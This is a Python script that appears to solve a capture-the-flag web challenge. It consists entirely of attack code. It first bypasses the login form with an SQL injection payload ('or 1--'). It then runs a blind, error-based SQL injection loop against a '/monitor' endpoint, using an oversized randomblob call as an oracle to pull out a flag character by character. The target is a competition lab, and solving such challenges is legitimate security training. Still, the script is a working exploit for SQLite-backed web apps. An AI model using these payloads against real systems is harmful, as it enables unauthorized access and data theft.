import requests
import re
import string

url = "https://fishsite-4492cf65f1130a9f.challenges.2025.vuwctf.com"
s = requests.Session()

# login
res = s.post(f"{url}/login", data={
    "username": "' or 1--",
    "password": ''
})

if "administration" in res.text:
    print("> Logged in")

# error-based sqli
charset = string.ascii_lowercase + string.digits + "{}_"

flag = "VuwCTF{"

while not flag.endswith("}"):
    for char in charset:
        print("Trying:", char, "|", flag)

        payload = f'select 1 union select randomblob(10000000000000000000000000000000000000000) where (select count(*) from flag where content LIKE "{flag}{char}%")=0'

        res = s.post(f'{url}/monitor', data={ 'query': payload })
        
        if "success" in res.text.lower():
            flag += char
            break

print("Flag:", flag)